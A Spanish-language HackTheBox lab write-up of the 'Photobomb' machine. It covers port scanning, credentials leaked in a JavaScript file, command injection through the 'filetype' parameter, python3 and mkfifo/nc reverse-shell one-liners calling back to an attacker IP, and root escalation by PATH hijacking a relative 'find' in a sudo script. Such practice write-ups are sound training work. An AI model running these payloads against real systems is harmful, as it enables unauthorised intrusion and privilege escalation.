---
title: Photobomb - HackTheBox
categories: [ Linux ]
tags: [HackTheBox]
---

<img src="/assets/img/HTB/Photobomb/Photobomb.jpg">

Hoy tocará explotar la máquina **Photobomb** de [HackTheBox](https://app.hackthebox.com/machines/photobomb), es de dificultad fácil. Haremos un `command injection` y para la escalada haremos un `Path Hijacking`


## Escaneo NMAP

Antes de empezar les recomiendo hacer un escaneo para saber que puertos estan abiertos y que servicios corren por ellos, ya que esta información nos sera util para continuar con la prueba de penetración.

```bash
❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.182 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-04 13:24 -04
Initiating SYN Stealth Scan at 13:24
Scanning 10.10.11.182 [65535 ports]
Discovered open port 80/tcp on 10.10.11.182
Discovered open port 22/tcp on 10.10.11.182
Completed SYN Stealth Scan at 13:24, 17.92s elapsed (65535 total ports)
Nmap scan report for 10.10.11.182
Host is up, received user-set (0.16s latency).
Scanned at 2023-02-04 13:24:12 -04 for 18s
Not shown: 61907 closed tcp ports (reset), 3626 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 18.08 seconds
           Raw packets sent: 87248 (3.839MB) | Rcvd: 67894 (2.716MB)
```



Nos percatamos que tiene el SSH abierto y el puerto 80 que corresponde al HTTP, al entrar a la web no vemos nada, ya que se esta aplicando virtual hosting, para solucionarlo hacemos lo siguiente:



```bash
echo "10.10.11.182       photobomb.htb" | tee -a /etc/hosts
```

## Enumeración

Vemos una pagina de inicio con un redirect a `/printer`


 ![WebSite]({{ '/assets/img/HTB/Photobomb/main.png' | relative_url }}){: .center-image }
 _Web Site_


Si intentamos acceder nos pedirá credenciales

 ![login]({{ '/assets/img/HTB/Photobomb/login.png' | relative_url }}){: .center-image }
 _Log in_

Podemos probar credenciales típicas por defecto, pero no resultará útil.

```
admin:admin
admin:password
admin:pass
guest:guest

```
Si revisamos el código fuente nos encontramos con cosaas interesantes.

Le aplicamos un **curl**.
```bash
❯ curl -s -X GET http://photobomb.htb
<!DOCTYPE html>
<html>
<head>
  <title>Photobomb</title>
  <link type="text/css" rel="stylesheet" href="styles.css" media="all" />
  <script src="photobomb.js"></script>
</head>
<body>
  <div id="container">
    <header>
      <h1><a href="/">Photobomb</a></h1>
    </header>
    <article>
      <h2>Welcome to your new Photobomb franchise!</h2>
      <p>You will soon be making an amazing income selling premium photographic gifts.</p>
      <p>This state of-the-art web application is your gateway to this fantastic new life. Your wish is its command.</p>
      <p>To get started, please <a href="/printer" class="creds">click here!</a> (the credentials are in your welcome pack).</p>
      <p>If you have any problems with your printer, please call our Technical Support team on 4 4283 77468377.</p>
    </article>
  </div>
</body>
</html>
```
Podemos ver un script de JavaScript, si vemos su contenido se nos filtra una cookie

```bash
❯ curl -s -X GET http://photobomb.htb/photobomb.js
function init() {
  // Jameson: pre-populate creds for tech support as they keep forgetting them and emailing me
  if (document.cookie.match(/^(.*;)?\s*isPhotoBombTechSupport\s*=\s*[^;]+(.*)?$/)) {
    document.getElementsByClassName('creds')[0].setAttribute('href','http://pH0t0:b0Mb!@photobomb.htb/printer');
  }
}
window.onload = init;
```
Al copiar dicha cookie, podemos ver el panel `/printer`.

![login]({{ '/assets/img/HTB/Photobomb/confirm.png' | relative_url }}){: .center-image }
_Log in_

## Explotación

En este apartado vemos unas imagenes las cuales podemos descargar y hacer pequeñas modificaciones como ser:
>Cambiarle la extensión y modicar el tamaño.


![printer]({{ '/assets/img/HTB/Photobomb/printer.png' | relative_url }}){: .center-image }
_Printer_

Podemos interceptar la petición con BurpSuite y ver mas a detalles como se estructura todo

![Burp]({{ '/assets/img/HTB/Photobomb/burp.png' | relative_url }}){: .center-image }
_BurpSuite_

Podemos ver si es vulnerable a un **Command injection**, pero antes que nada inicia un servidor con `python`

```bash
python -m http.server 80
```
Mandamos la petición al `Repeater`, para ello presionamos `Ctrl + R`
Si nos fijamos en los parametros podemos agregar `;` y añadir nuestro comando, se vería así

![BurpSuite]({{ '/assets/img/HTB/Photobomb/burp1.png' | relative_url }}){: .center-image }
_BurpSuite_

Podemos ver que no le gusta en algunos parametros, pero con haciendo prueba y error encontramos que el parametro `filetype` es vulnerable, lo podemos comprobar en la petición

```bash
❯ python -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.11.182 - - [04/Feb/2023 14:45:12] "GET / HTTP/1.1" 200 -
```
Podemos intentar enviarnos una reverse shell, usano esta [página](https://www.revshells.com/) podemos hacer la reverse shell con varias opciones.
Probaremos con bash pero no funciona, así que podemos probar con python3 y esta nos lanzará la shell

```python
export RHOST="10.10.14.25";export RPORT=444;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("bash")'
```
![RCE]({{ '/assets/img/HTB/Photobomb/burp2.png' | relative_url }}){: .center-image }
_RCE_


>Nota: Si usas nc mkfifo y url encode te lanzará la shell igual

```bash
rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7Cbash%20-i%202%3E%261%7Cnc%2010.10.14.25%20444%20%3E%2Ftmp%2Ff
```

Ganamos acceso a la máquina, estamos listos para rootearla
```bash
❯ nc -lvnp 444
listening on [any] 444 ...
connect to [10.10.14.25] from (UNKNOWN) [10.10.11.182] 49946
wizard@photobomb:~/photobomb$ 
```
Toca realizar un tratamiento a la tty, te puedes guiar de mi [blog](https://h4ckerlite.github.io/posts/tty).


Una vez adentro podemos leer la primera flag

```bash
wizard@photobomb:~/photobomb$ cat ../user.txt 
06****************************78
wizard@photobomb:~/photobomb$ 
```



## Escalada de privilegios

Si vemos los privilegios **SUDOERS** vemos que podemos ejecutar un programa hecho en **bash**

```bash
wizard@photobomb:~/photobomb$ sudo -l
Matching Defaults entries for wizard on photobomb:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User wizard may run the following commands on photobomb:
    (root) SETENV: NOPASSWD: /opt/cleanup.sh
wizard@photobomb:~/photobomb$ 

```
Vemos que lo podemos ejecutar sin proporcionar ninguna contraseña, es decir que al ejecuralo como **sudo** sera ejecutado de forma temporal como root sin proporcionar contraseña

```bash
wizard@photobomb:~/photobomb$ sudo /opt/cleanup.sh 
wizard@photobomb:~/photobomb$ 
```

Si vemos el contenido de dicho archivo nos encontramos con binarios que podemos usar para elevar nuestros privilegios.

```bash
wizard@photobomb:~/photobomb$ cat /opt/cleanup.sh 
#!/bin/bash
. /opt/.bashrc
cd /home/wizard/photobomb

# clean up log files
if [ -s log/photobomb.log ] && ! [ -L log/photobomb.log ]
then
  /bin/cat log/photobomb.log > log/photobomb.log.old
  /usr/bin/truncate -s0 log/photobomb.log
fi

# protect the priceless originals
find source_images -type f -name '*.jpg' -exec chown root:root {} \;
wizard@photobomb:~/photobomb$ 

```
Vemos que el binario `find` esta con ruta relativa no absoluta y esto puede derivar a un **Path Hijacking**, 

Podemos aprovechar que podemos cambiar variables de entorno como el Path para que nos ejecute el comando find personalizado, y bajo el contexto de sudo nuestro binario find lo ejecutará root.

```bash
wizard@photobomb:/tmp$ echo bash > find
wizard@photobomb:/tmp$ chmod 777 find 
wizard@photobomb:/tmp$ sudo PATH=$PWD:$PATH /opt/cleanup.sh
wizard@photobomb:/tmp$ ls -l /bin/bash
root@photobomb:/home/wizard/photobomb# 

```
Ya rooteamos la máquina, lo que hicimos fue hacer un binario perzonalizado find que nos lanze una bash como root, en este caso, ya que el esta ejecutando el `/opt/cleanup.sh` con el binario find de forma relativa.
Procedemos a leer la flag

```bash
root@photobomb:/home/wizard/photobomb# cat /root/root.txt 
74****************************35
root@photobomb:/home/wizard/photobomb# 
```
¡¡¡Máquina Pwneada!!! Te deseo un Feliz Hackeo.

